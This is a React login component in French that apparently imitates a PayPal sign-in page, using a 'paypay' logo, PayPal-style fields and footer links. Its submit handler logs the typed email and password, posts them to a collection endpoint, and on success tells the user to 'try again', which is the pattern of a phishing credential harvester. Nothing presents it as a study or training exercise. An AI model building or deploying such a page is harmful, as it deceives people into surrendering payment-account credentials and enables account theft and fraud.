import React,{useEffect, useState} from "react";
import "./Accueil.css";
import logo from "../../Assets/paypay.jpg"

export default function Accueil(){

useEffect(() => {
    // code to run when the effect is triggered
      
    const inputField = document.getElementById('input-field');
    const inputLabel = document.getElementById('input-label');

    const inputField2 = document.getElementById('input-field2');
    const inputLabel2 = document.getElementById('input-label2');

    // Lorsque l'input obtient le focus
    inputField.addEventListener('focus', () => {
        inputLabel.style.top = '3px';
        inputLabel.style.left = '0px';
        inputLabel.style.fontSize = '13px';
    });

    inputField2.addEventListener('focus', () => {
        inputLabel2.style.top = '3px';
        inputLabel2.style.left = '0px';
        inputLabel2.style.fontSize = '13px';
    });


    // Lorsque l'input perd le focus
    inputField.addEventListener('blur', () => {
        // Si l'input n'est pas vide, laissez le label en haut
        if (inputField.value.trim() !== '') {
            inputLabel.style.top = '3px';
            inputLabel.style.left = '0px';
        } else {
            // Sinon, ramenez le label à sa position initiale
            inputLabel.style.top = '17px';
            inputLabel.style.left = '8px';
            inputLabel.style.fontSize = '16px';
        }
    });

    inputField2.addEventListener('blur', () => {
        // Si l'input n'est pas vide, laissez le label en haut
        if (inputField2.value.trim() !== '') {
            inputLabel2.style.top = '3px';
            inputLabel2.style.left = '0px';
        } else {
            // Sinon, ramenez le label à sa position initiale
            inputLabel2.style.top = '17px';
            inputLabel2.style.left = '8px';
            inputLabel2.style.fontSize = '16px';
        }
    });
}, []);

    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = (e) => {
        e.preventDefault();

        console.log("Numéro de téléphone : " + email);
        console.log("Mot de passe : " + password);

        fetch("http://localhost:3000/compte/login-compte",{
        method: "POST",
        crossDomain: true,
        headers:{
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
        body:JSON.stringify({
            email,
            password,
        }),
    })
    .then((res) => res.json())
    .then((data) => {
        if(data.status === "ok"){
            alert('Veuillez Rééssayer')
        }else{
            alert('Something went wrong')
        }
    })

    }

    return(
        <div className="accueil">
            <div className="box">
                <div className="image_pay">
                    <img src={logo} alt="pay-logo" />
                </div>
                <div className="information_form">
                    <form method="post" className="formul" onSubmit={handleSubmit} >
                        <div className="info_groupe">
                            <input className="email_phone_pass" type="text" id="input-field" value={email} onChange={(e) => setEmail(e.target.value)} required />
                            <label htmlFor="" className="placeholder" id="input-label">Email ou numéro de mobile</label>
                        </div>
                        <div className="info_groupe">
                            <input className="email_phone_pass" type="password" id="input-field2" value={password} onChange={(e) => setPassword(e.target.value)} required/>
                            <label htmlFor="" className="placeholder" id="input-label2">Mot de passe</label>
                        </div>
                        <div className="mdp">Mot de passe oublié ?</div>
                        <input className="submit_button" type="submit" value="Connexion" />
                        <div className="ou">
                            <span className="hr"></span>
                            <span>ou</span>
                            <span className="hr"></span>
                        </div>
                        <div className="open_account">
                            Ouvrir un compte
                        </div>
                    </form>
                </div>
                <div className="language">
                    Français | Anglais
                </div>
            </div> 
            <div className="footer">
                <ul>
                    <li>Contact</li>
                    <li>Respect de la vie privée</li>
                    <li>Contrats d'utilisation</li>
                    <li>International</li>
                </ul>
            </div>  
        </div>
)}